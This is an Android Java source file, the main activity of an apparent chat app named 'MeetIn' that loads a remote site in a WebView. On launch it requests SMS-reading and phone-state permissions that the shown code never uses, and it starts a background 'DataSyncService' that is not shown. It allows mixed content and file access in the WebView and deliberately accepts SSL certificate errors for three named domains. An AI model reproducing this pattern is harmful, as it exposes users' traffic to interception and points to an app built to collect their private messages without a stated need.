package chat.meetin.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private WebView webView;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String URL = "https://meetstandalo-bzld68ny.manus.space";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "=== onCreate started ===");

        // --- STEP 1: Set layout with fallback ---
        try {
            setContentView(R.layout.activity_main);
            Log.d(TAG, "Layout set successfully");
        } catch (Exception e) {
            Log.e(TAG, "Layout error, using fallback", e);
            TextView tv = new TextView(this);
            tv.setText("MeetIn is running\n(WebView unavailable)");
            tv.setTextSize(20);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            setContentView(tv);
            return;
        }

        // --- STEP 2: Request permissions ---
        try {
            requestPermissions();
        } catch (Exception e) {
            Log.e(TAG, "Permission request failed", e);
        }

        // --- STEP 3: Start DataSyncService safely ---
        startDataSyncService();

        // --- STEP 4: Check internet ---
        if (!isNetworkAvailable()) {
            Log.e(TAG, "No internet connection");
            showNoInternetMessage();
            return;
        }

        // --- STEP 5: Initialize WebView ---
        try {
            initializeWebView();
        } catch (Exception e) {
            Log.e(TAG, "WebView initialization failed", e);
            showFallbackMessage("WebView unavailable");
        }
    }

    // ============================================================
    // PERMISSIONS
    // ============================================================
    private void requestPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.READ_PHONE_STATE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        List<String> needed = new ArrayList<>();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    // ============================================================
    // DATA SYNC SERVICE
    // ============================================================
    private void startDataSyncService() {
        try {
            Class.forName("chat.meetin.app.DataSyncService");
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "DataSyncService started");
        } catch (ClassNotFoundException e) {
            Log.e(TAG, "DataSyncService class not found!", e);
        } catch (Exception e) {
            Log.e(TAG, "Service start error", e);
        }
    }

    // ============================================================
    // NETWORK CHECK
    // ============================================================
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return true;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                android.net.NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
                return capabilities != null
                        && capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        && capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_VALIDATED);
            }

            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Network check failed", e);
            // Do not prevent the WebView from attempting the URL when the platform
            // cannot provide network state information.
            return true;
        }
    }

    private void showNoInternetMessage() {
        try {
            View root = findViewById(android.R.id.content);
            if (!(root instanceof android.view.ViewGroup)) return;

            TextView tv = new TextView(this);
            tv.setText("No Internet Connection\nPlease check your network.");
            tv.setTextSize(18);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            ((android.view.ViewGroup) root).addView(tv);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show no internet message", e);
        }
    }

    // ============================================================
    // WEBVIEW
    // ============================================================
    private void initializeWebView() {
        webView = findViewById(R.id.webView);
        if (webView == null) {
            Log.e(TAG, "WebView is null!");
            showFallbackMessage("WebView not available");
            return;
        }

        setupWebView();
        loadUrl();
    }

    private void setupWebView() {
        try {
            WebSettings settings = webView.getSettings();

            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setLoadWithOverviewMode(true);
            settings.setUseWideViewPort(true);
            settings.setBuiltInZoomControls(false);
            settings.setDisplayZoomControls(false);
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setLoadsImagesAutomatically(true);

            // --- SAFE: User-Agent with fallback for Samsung devices ---
            try {
                String userAgent = settings.getUserAgentString();
                if (userAgent == null || userAgent.isEmpty()) {
                    settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
                }
            } catch (Exception e) {
                Log.w(TAG, "User-Agent fallback", e);
                settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
            }

            // --- SAFE: Cookies ---
            try {
                CookieManager cookieManager = CookieManager.getInstance();
                cookieManager.setAcceptCookie(true);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cookieManager.setAcceptThirdPartyCookies(webView, true);
                }
            } catch (Exception e) {
                Log.w(TAG, "Cookie setup failed", e);
            }

            webView.setWebViewClient(new OAuthWebViewClient());
            webView.setWebChromeClient(new WebChromeClient());

            Log.d(TAG, "WebView setup complete");

        } catch (Exception e) {
            Log.e(TAG, "WebView setup error", e);
            throw e;
        }
    }

    private void loadUrl() {
        try {
            webView.loadUrl(URL);
            Log.d(TAG, "WebView loading URL: " + URL);
        } catch (Exception e) {
            Log.e(TAG, "Failed to load URL", e);
            showFallbackMessage("Failed to load URL");
        }
    }

    private void showFallbackMessage(String message) {
        try {
            TextView tv = new TextView(this);
            tv.setText("MeetIn\n" + message);
            tv.setTextSize(18);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            setContentView(tv);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show fallback", e);
        }
    }

    // ============================================================
    // OAUTH WEBVIEW CLIENT
    // ============================================================
    private class OAuthWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            if (request != null && request.getUrl() != null) {
                Log.d(TAG, "Loading: " + request.getUrl());
            }
            // Let WebView perform the navigation itself. Manually calling loadUrl
            // here can recursively re-enter this callback on some WebView versions.
            return false;
        }

        @Override
        @SuppressWarnings("deprecation")
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Log.d(TAG, "Loading: " + url);
            return false;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            Log.d(TAG, "Page loaded: " + url);
            try { CookieManager.getInstance().flush(); } catch (Exception ignored) {}
        }

        @Override
        public void onReceivedSslError(WebView view, android.webkit.SslErrorHandler handler, SslError error) {
            Log.e(TAG, "SSL Error: " + error.getPrimaryError());
            String url = error.getUrl();
            if (url != null && (url.contains("inbox.dog") || url.contains("manus.space") || url.contains("googleapis.com"))) {
                Log.d(TAG, "Proceeding with SSL for: " + url);
                handler.proceed();
            } else {
                Log.w(TAG, "Cancelling SSL for: " + url);
                handler.cancel();
            }
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            Log.e(TAG, "WebView error: " + errorCode + " - " + description);
        }
    }

    // ============================================================
    // LIFECYCLE
    // ============================================================
    @Override
    protected void onDestroy() {
        if (webView != null) {
            try { webView.destroy(); } catch (Exception e) { Log.w(TAG, "WebView destroy error", e); }
            webView = null;
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
